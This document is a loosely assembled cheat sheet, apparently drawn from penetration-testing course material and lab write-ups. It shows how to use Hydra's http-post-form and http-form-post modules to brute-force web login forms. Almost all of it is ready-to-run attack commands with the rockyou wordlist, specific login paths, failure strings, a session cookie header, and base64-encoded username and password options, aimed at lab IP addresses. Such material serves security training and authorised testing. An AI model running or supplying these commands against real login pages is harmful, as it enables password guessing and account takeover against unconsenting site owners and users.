I’ll run hydra with the following options:

    -l muted - hydra requires a username, even if it won’t use it
    -P [password file] - a file of passwords to try
    https-post-form - this is the plugin to use, which takes a string with three parts, : separated:
        /db/index.php - the path to POST to
        password=^PASS^&remember=yes&login=Log+In&proc_login=true - the POST data, with ^PASS^ being the thing that will be replaced with words from the wordlist
        Incorrect password - text on the response that indicates failure to login

root@kali# hydra 10.10.x.x -l muted -P /usr/share/seclists/Passwords/twitter-banned.txt https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"

HTTP-Post-Form
Bruteforce web HTTP form
hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "<Login Page>:<Request Body>:<Error Message>"
sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"

After filling in the placeholders, here’s our command:
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.x http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"

HTTP-form-post
Putting these pieces together, we can complete the http-form-post syntax as given in Listing 21.
Specifying the http-form-post syntax
http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN"
    
The complete command can now be executed. 
We will supply the admin user name (-l admin) and wordlist (-P), request verbose output with -vV, and use -f to stop the attack when the first successful result is found. 
In addition, we will supply the service module name (http-form-post) and its required arguments ("/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN") 
kali@kali:~$ hydra 10.11.0.x http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f

Hydra Post on a forum
hydra -l mute -P /usr/share/wordlists/rockyou.txt internal.site.tld http-form-post "/simple_chat/login.php:uname=^USER^&passwd=^PASS^&submit=login:Invalid Username or Password"

Post with Cookies
hydra -l garry -F -P /usr/share/wordlists/rockyou.txt 10.11.x.x -s 8080 http-post-form "/php/index.php:tg=login&referer=index.php&login=login&sAuthType=Ovidentia&nickname=^USER^&password=^PASS^&submit=Login:F=Failed:H=Cookie\: OV3176019645=a4u215fgf3tj8718i0b1rj7ia5"

-F stop after getting login
http-post-form “<url>:<post data>:F=<fail text:H=<header>”
  
HTTP-Post  
sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"
After filling in the placeholders, here’s our actual command!
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"

The HTTP POST body sends two values in the login form to /service/rapture/sesssion — a username and a password, both base64 encoded.  
Check headers filename to see where the http post body is sending the two values

A valid hydra command would look like this:
# -I : ignore any restore files
# -f : stop when a login is found
# -L : username list
# -P : password list
# ^USER64^ and ^PASS64^ tells hydra to base64-encode the values <-- Base64 Encode
# C=/ tells hydra to establish session cookies at this URL
# F=403 tells hydra that HTTP 403 means invalid login

hydra -I -f -L usernames.txt -P passwords.txt 'http-post-form://192.168.207.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://192.168.207.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
kali@kali:~$ sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
